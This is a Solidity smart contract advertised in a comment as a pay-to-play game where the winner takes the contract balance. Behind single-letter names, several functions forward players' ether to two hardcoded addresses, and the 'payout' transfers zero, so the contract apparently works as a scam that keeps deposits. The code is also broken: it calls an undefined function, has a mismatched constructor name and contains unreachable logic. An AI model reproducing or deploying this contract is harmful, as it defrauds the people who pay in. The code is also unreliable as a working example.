// winner gets the contract balance
// 0.02 to play

pragma solidity ^0.4.23;

contract FundManager {

//constants

address public ab = 0x0;
address public ad;
address public i = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public h = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public u;

mapping(address=>bool) d;

uint256 public z;
uint256[] public ag = [951828771,158769871220];
uint256[] public balance;

//constructor

function DranMe() public payable{
	ad = msg.sender;
}

//modifiers

modifier r() {
    require(msg.sender == ad);
    _;
}

modifier l() {
    require(msg.sender == ab);
    _;
}

modifier j() {
    require(d[msg.sender]);
    _;
}

//functions

function n() public constant returns(uint256) {
	return ag.length;
}

function o(uint256 w) public payable r{
	z = w;
}

function e() public constant returns(uint256) {
	return u.length;
}

function s() public constant returns(uint256) {
	return address(this).balance;
}

function g() public payable{
	require(msg.value >= 0.02 ether);
	u.push(msg.sender);
	d[msg.sender]=true;
}

function b() public payable j{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=ad || f()){
	    uint256 aa = 0;
        msg.sender.transfer(aa);
	}
}

function f() private returns(bool){
    bytes32 af = q(blockhash(block.number-1));
    uint256 z = uint256(af);
        if(z%5==0){
            ab = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function c () public payable j {
	require (msg.value >= 0.005 ether);
	i.call.value(msg.value)();
}

function a () public payable j {
	require (msg.value >= 0.005 ether);
	h.call.value(msg.value)();
}

function v (uint256 ac, uint256 y) public payable j {
	ag[ac] = y;
}

function x (uint256 ah) public payable j {
	ag.length = ah;
}

function p (uint256 ae) public payable j returns(uint256) {
	return (ae / (ag[0]*ag[1]));
	if((ae / (ag[0]*ag[1])) == z) {
		ad = ab;
	}
}

function k () public payable j returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == z){
        return true;
    }
}

function t() public payable r {
	ad.call.value(1 wei)();
}

function m() public payable l {
	ab.transfer(address(this).balance);
}

//fallback function

function() public payable{
	}
}
